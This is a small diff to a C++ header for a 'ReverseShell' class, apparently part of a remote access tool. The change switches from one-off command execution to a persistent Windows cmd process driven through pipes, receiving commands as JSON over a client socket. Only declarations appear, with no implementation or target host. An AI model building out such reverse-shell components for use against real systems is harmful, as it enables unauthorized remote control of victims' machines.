@@ -17,11 +17,16 @@
 class ReverseShell : public Handler {
 private:
     std::string currentDirectory=".";
+    HANDLE hWrite{}, hRead{};
+    HANDLE hWriteCmd{}, hReadCmd{};
+    PROCESS_INFORMATION pi{};
+    std::atomic<bool> isShellOpen = false;
 public:
-    void executeCommandAndSendResult(nlohmann::json jsonObject);
+    void readOutput();
     explicit ReverseShell(ClientSocket &clientSocket);
-    std::string executeCommand(const std::wstring&);
-    static int runCmd(const std::string &commandToExecute, std::string& outOutput);
+    void initializeCMDProcess();
+    void closeCMDProcess();
+    void runCommand(nlohmann::json jsonObject);
 };
 
 
